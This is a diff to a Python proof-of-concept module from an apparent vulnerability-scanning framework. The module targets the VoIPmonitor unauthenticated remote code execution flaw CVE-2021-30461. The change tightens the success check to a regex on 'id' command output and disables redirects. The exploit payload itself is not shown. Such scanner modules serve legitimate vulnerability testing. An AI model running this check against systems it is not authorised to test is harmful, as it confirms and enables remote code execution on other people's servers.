@@ -4,17 +4,19 @@ from lib.core.common import url_handle,get_random_ua
 from lib.core.poc import POCBase
 # ...
 import urllib3
+import re
 urllib3.disable_warnings()
 
 class POC(POCBase):
 
     _info = {
         "author" : "jijue",                      # POC作者
-        "version" : "1",                    # POC版本，默认是1  
+        "version" : "2",                    # POC版本，默认是1  
         "CreateDate" : "2021-06-09",        # POC创建时间
         "UpdateDate" : "2021-06-09",        # POC创建时间
         "PocDesc" : """
-            略  
+            v1 : 略  
+            v2 : 改成了正则匹配的模式，有效降低了误报率
         """,                                # POC描述，写更新描述，没有就不写
 
         "name" : "VoIPmonitor 未授权远程代码执行(CVE-2021-30461)",                        # 漏洞名称
@@ -56,9 +58,9 @@ class POC(POCBase):
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req = requests.post(url,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-
-            if "uid=" in req.text:
+            req = requests.post(url,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False,allow_redirects=False)
+            result = re.search("uid=\d+\(.+\) gid=\d+\(.+\) groups=\d+\(.+\)",req.text.strip())
+            if result and req.text:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
